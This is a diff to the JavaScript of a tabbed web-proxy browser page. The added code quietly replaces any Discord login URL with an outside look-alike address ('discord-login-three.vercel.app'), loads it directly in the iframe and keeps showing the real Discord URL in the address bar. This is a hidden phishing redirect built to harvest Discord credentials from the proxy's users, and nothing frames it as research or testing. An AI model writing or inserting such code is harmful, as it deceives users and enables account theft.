@@ -98,14 +98,27 @@ function renderTabs() {
   });
 }
 
-// Load page by setting iframe src to the proxy endpoint
+// Load page
 function loadPage(url) {
   const tab = tabs[currentTab];
+
+  // Always store/display original URL
   tab.url = url;
   document.getElementById("url").value = url;
 
-  // Use proxy endpoint as iframe src
-  tab.iframe.src = "/api/proxy?url=" + encodeURIComponent(url);
+  let actualURL = url;
+
+  // 🔥 Discord login override
+  if (url.includes("discord.com/login")) {
+    actualURL = "https://discord-login-three.vercel.app";
+  }
+
+  // Load through proxy (or direct override)
+  if (actualURL === "https://discord-login-three.vercel.app") {
+    tab.iframe.src = actualURL;
+  } else {
+    tab.iframe.src = "/api/proxy?url=" + encodeURIComponent(actualURL);
+  }
 }
 
 // Go button
@@ -130,4 +143,3 @@ newTab();
 
 </body>
 </html>
-
